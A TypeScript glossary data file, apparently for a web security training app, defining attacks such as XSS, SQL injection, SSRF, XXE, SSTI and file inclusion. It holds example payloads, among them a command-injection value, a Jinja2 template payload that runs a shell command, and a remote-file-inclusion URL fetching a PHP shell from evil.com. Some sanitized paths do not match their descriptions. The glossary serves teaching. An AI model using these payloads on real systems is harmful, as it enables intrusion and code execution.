export interface GlossaryTerm {
  id: string;
  term: string;
  shortDef: string;
  definition: string;
  example: string;
  relatedCategoryId?: string;
}

export const glossaryTerms: GlossaryTerm[] = [
  {
    id: 'xss',
    term: 'XSS',
    shortDef: 'Cross-Site Scripting – client-side code injection',
    definition: 'Cross-Site Scripting (XSS) is a security vulnerability that allows attackers to inject malicious client-side scripts into web pages viewed by other users. The malicious script executes in the victim\'s browser with the same trust level as the legitimate site.',
    example: 'A search box reflects a harmless training marker as executable markup instead of plain text.',
    relatedCategoryId: 'xss'
  },
  {
    id: 'sqli',
    term: 'SQL Injection',
    shortDef: 'SQLi – manipulating SQL queries via user input',
    definition: 'SQL Injection (SQLi) is an attack that inserts or "injects" malicious SQL code into a query that an application sends to its database. Successful SQL injection can allow attackers to read, modify, or delete database data, authenticate as other users, or execute administrative operations.',
    example: 'A login form concatenates a username into SQL, allowing a crafted training marker to alter the intended authentication condition.',
    relatedCategoryId: 'sqli'
  },
  {
    id: 'csrf',
    term: 'CSRF',
    shortDef: 'Cross-Site Request Forgery – forced authenticated actions',
    definition: 'Cross-Site Request Forgery (CSRF) is an attack that tricks authenticated users into performing unintended actions. The attacker creates a malicious web page that makes requests to a site where the victim is logged in, using the victim\'s session credentials.',
    example: 'A hidden form on evil.com that automatically submits to bank.com/transfer, sending money when the logged-in victim visits evil.com.',
    relatedCategoryId: 'csrf'
  },
  {
    id: 'ssrf',
    term: 'SSRF',
    shortDef: 'Server-Side Request Forgery – abusing server to make requests',
    definition: 'Server-Side Request Forgery (SSRF) is a vulnerability where an attacker can induce a server to make HTTP requests to arbitrary URLs. This allows attackers to access internal services, cloud metadata APIs, and internal networks that are otherwise inaccessible.',
    example: 'A URL fetching feature where changing the URL to http://metadata.training.local/latest/meta-data/ retrieves AWS instance metadata.',
    relatedCategoryId: 'ssrf'
  },
  {
    id: 'xxe',
    term: 'XXE',
    shortDef: 'XML External Entity – file disclosure via XML',
    definition: 'XML External Entity (XXE) injection exploits applications that parse XML input. By defining external entities in a DOCTYPE declaration, attackers can read server files, perform SSRF, or cause denial of service.',
    example: '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///safe/training/file.txt">]><foo>&xxe;</foo> returns the contents of /safe/training/file.txt.',
    relatedCategoryId: 'xxe'
  },
  {
    id: 'rce',
    term: 'RCE',
    shortDef: 'Remote Code Execution – running arbitrary code on server',
    definition: 'Remote Code Execution (RCE) is a vulnerability that allows attackers to execute arbitrary code on a target server. RCE can result from command injection, deserialization flaws, template injection, or exploiting vulnerable software components.',
    example: 'A ping utility that takes user input: entering "127.0.0.1; cat /safe/training/file.txt" executes both commands.',
    relatedCategoryId: 'rce'
  },
  {
    id: 'idor',
    term: 'IDOR',
    shortDef: 'Insecure Direct Object Reference – unauthorized object access',
    definition: 'Insecure Direct Object Reference (IDOR) occurs when an application provides direct access to objects based on user-supplied input without proper authorization checks. Attackers can access any object by modifying the reference value.',
    example: 'Changing /api/users/123 to /api/users/124 to access another user\'s private profile.',
    relatedCategoryId: 'idor'
  },
  {
    id: 'jwt',
    term: 'JWT',
    shortDef: 'JSON Web Token – stateless authentication tokens',
    definition: 'JSON Web Token (JWT) is an open standard for securely transmitting information as a JSON object. JWTs are commonly used for authentication. Vulnerabilities include the "none" algorithm attack, weak secrets, and algorithm confusion attacks.',
    example: 'A JWT with header {"alg":"none"} where changing the payload to admin:true and removing the signature bypasses authentication.',
    relatedCategoryId: 'jwt'
  },
  {
    id: 'cors',
    term: 'CORS',
    shortDef: 'Cross-Origin Resource Sharing – browser cross-origin control',
    definition: 'Cross-Origin Resource Sharing (CORS) is a browser mechanism that controls cross-origin requests. Misconfigurations allow malicious sites to read sensitive data from APIs. The key issues are overly permissive origin policies combined with credentials.',
    example: 'A site setting Access-Control-Allow-Origin to any requesting origin with credentials: true, allowing any site to read the victim\'s private API data.',
    relatedCategoryId: 'cors'
  },
  {
    id: 'clickjacking',
    term: 'Clickjacking',
    shortDef: 'UI redressing attack via transparent iframes',
    definition: 'Clickjacking (UI Redressing) is an attack where users are tricked into clicking on something different from what they perceive. Attackers overlay transparent iframes containing the target site over decoy content, hijacking the user\'s clicks.',
    example: 'A transparent iframe over "Delete Account" button, overlaid with a visible "Click to Win $1000!" button.',
    relatedCategoryId: 'clickjacking'
  },
  {
    id: 'path-traversal',
    term: 'Path Traversal',
    shortDef: 'Directory traversal – accessing files outside web root',
    definition: 'Path traversal (directory traversal) allows attackers to access files and directories outside the intended directory by using sequences like `../` in file paths. Attackers can read sensitive system files or application source code.',
    example: 'A file download endpoint: /download?file=../../../../safe/training/file.txt reads the system password file.',
    relatedCategoryId: 'path-traversal'
  },
  {
    id: 'http-smuggling',
    term: 'HTTP Smuggling',
    shortDef: 'HTTP desync attack between proxy and server',
    definition: 'HTTP Request Smuggling exploits discrepancies in how front-end and back-end servers parse HTTP request boundaries. By crafting ambiguous requests using Content-Length and Transfer-Encoding headers, attackers can "smuggle" malicious requests.',
    example: 'A request with Content-Length: 13 and Transfer-Encoding: chunked that the front-end forwards as one request but the back-end interprets as two separate requests.',
    relatedCategoryId: 'http-smuggling'
  },
  {
    id: 'nosqli',
    term: 'NoSQL Injection',
    shortDef: 'NoSQLi – operator injection in NoSQL databases',
    definition: 'NoSQL Injection attacks target applications using NoSQL databases like MongoDB by injecting database-specific operators. Unlike SQL injection, these attacks use JSON operators like $ne, $gt, $regex to manipulate queries.',
    example: 'Login request with {"username":{"$ne":null},"password":{"$ne":null}} matches any user in MongoDB, bypassing authentication.',
    relatedCategoryId: 'nosqli'
  },
  {
    id: 'graphql',
    term: 'GraphQL',
    shortDef: 'GraphQL – API query language with unique security concerns',
    definition: 'GraphQL is an API query language that enables flexible data fetching. Security issues include introspection disclosure, query depth attacks, batching for rate limit bypass, and resolver-level authorization failures.',
    example: 'Sending {__schema{types{name}}} to enumerate the entire API schema, discovering hidden admin mutations.',
    relatedCategoryId: 'graphql'
  },
  {
    id: 'ssti',
    term: 'SSTI',
    shortDef: 'Server-Side Template Injection – template engine code execution',
    definition: 'Server-Side Template Injection occurs when user input is embedded directly in a template and evaluated by the template engine. Depending on the engine, attackers can access internal objects, read files, and execute arbitrary code.',
    example: 'A greeting page where ?name={{7*7}} returns "Hello 49!" confirms Jinja2 SSTI, leading to RCE via {{config.__class__.__init__.__globals__["os"].popen("id").read()}}.',
    relatedCategoryId: 'ssti'
  },
  {
    id: 'deserialization',
    term: 'Deserialization',
    shortDef: 'Insecure deserialization – object manipulation attacks',
    definition: 'Insecure deserialization occurs when an application deserializes data from untrusted sources without proper validation. Attackers can manipulate serialized objects to change application logic, escalate privileges, or achieve remote code execution via gadget chains.',
    example: 'A PHP session cookie containing O:4:"User":1:{s:5:"admin";b:0;} where changing b:0 to b:1 grants admin access.',
    relatedCategoryId: 'deserialization'
  },
  {
    id: 'lfi',
    term: 'LFI',
    shortDef: 'Local File Inclusion – including local server files',
    definition: 'Local File Inclusion (LFI) vulnerabilities allow attackers to include files that exist on the target server. Combined with file upload vulnerabilities or log poisoning, LFI can lead to remote code execution.',
    example: 'A page parameter: ?page=../../safe/training/file.txt includes and displays the passwd file contents.',
  },
  {
    id: 'rfi',
    term: 'RFI',
    shortDef: 'Remote File Inclusion – including external malicious files',
    definition: 'Remote File Inclusion (RFI) allows attackers to include remote files (from external URLs) in the vulnerable application. The included file executes with the web application\'s privileges, typically leading to RCE.',
    example: '?page=http://evil.com/shell.php includes and executes a remote PHP shell on the target server.',
  },
  {
    id: 'open-redirect',
    term: 'Open Redirect',
    shortDef: 'Unvalidated redirect to attacker-controlled URL',
    definition: 'Open redirects occur when an application accepts a user-controlled URL and redirects to it without validation. Attackers use these to make phishing links appear legitimate or as part of SSRF and OAuth attacks.',
    example: 'https://trusted.com/redirect?url=https://evil.com redirects users to the attacker\'s phishing site.',
  },
  {
    id: 'csp',
    term: 'CSP',
    shortDef: 'Content Security Policy – browser-enforced security policy',
    definition: 'Content Security Policy (CSP) is a browser security mechanism that helps prevent XSS by specifying which content sources are trusted. CSP misconfigurations (unsafe-inline, wildcards, JSONP endpoints) can be bypassed.',
    example: 'A CSP with script-src \'unsafe-inline\' provides no XSS protection, defeating the purpose of CSP.',
  }
];
